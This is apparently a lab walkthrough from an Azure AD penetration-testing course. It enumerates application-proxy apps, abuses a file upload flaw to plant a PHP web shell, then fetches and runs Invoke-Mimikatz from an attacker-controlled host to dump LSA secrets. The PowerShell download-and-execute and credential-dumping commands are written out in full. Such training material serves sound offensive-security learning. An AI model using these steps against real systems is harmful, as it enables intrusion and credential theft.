## Objective 23 ***Part of - Kill Chain - 4***

```
- We created a user studentx@defcorphq.onmicrosoft.com by abusing CreateUsers repository on GitHub. Use the privileges of that user to find an Enterprise application that uses Application Proxy.
- Check if the above user is allowed to access the application.
- Abuse a file upload vulnerability in the application to get OS command execution on the on-prem server hosting the application and extract credentials.
```

- Connect to Azure AD using credentials of studentx@defcorphq.onmicrosoft.com
```powershell
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
$password = ConvertTo-SecureString 'StudxPassword@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('studentx@defcorphq.onmicrosoft.com', $Password)
Connect-AzureAD -Credential $creds -TenantId 2d50cb29-5f7b48a4-87ce-fe75a941adb6
```
- Enumerate all the applications that has application proxy configured
```powershell
 Get-AzureADApplication | %{try{GetAzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
 ```

- App Finance Management System seems to be using application proxy. Get the service principal (Enterprise Application) for it
```powershell
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Finance Management System"}
```
![test](/img/obj23b.png "Enumeration")


- Use **`C:\AzAD\Tools\Get-ApplicationProxyAssignedUsersAndGroups.ps1`** to find users and groups allowed to access the application:
```powershell
. C:\AzAD\Tools\GetApplicationProxyAssignedUsersAndGroups.ps1
Get-ApplicationProxyAssignedUsersAndGroups -ObjectId ec350d24-e4e4-4033-ad3f-bf60395f0362
```
![test](/img/obj23a.png "Enumeration")


- Let's access the application now
![test](/img/obj23.png "Enumeration")

- Go to config option in the left menu and upload studentxshell.phtml:
![test](/img/obj23c.png "Enumeration")

- On the listener we can see:
```powershell
 iex (New-Object Net.Webclient).DownloadString("http://172.16.x.x:82/Invoke-Mimikatz.ps1")
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"
 ```

![test](/img/obj23d.png "Enumeration")
